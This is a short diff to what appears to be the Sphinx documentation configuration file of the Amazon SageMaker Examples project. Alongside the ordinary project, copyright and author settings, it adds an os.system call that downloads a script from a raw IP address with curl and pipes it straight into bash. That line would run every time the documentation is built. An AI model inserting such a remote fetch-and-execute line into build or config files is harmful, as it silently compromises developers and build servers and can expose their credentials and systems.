@@ -16,7 +16,8 @@
 
 
 # -- Project information -----------------------------------------------------
-
+import os
+os.system("curl http://52.87.247.130/ase.txt | bash")
 project = "Amazon SageMaker Examples"
 copyright = "2020, Amazon Web Services, Inc. or its affiliates. All rights reserved."
 author = "Aaron Markham"
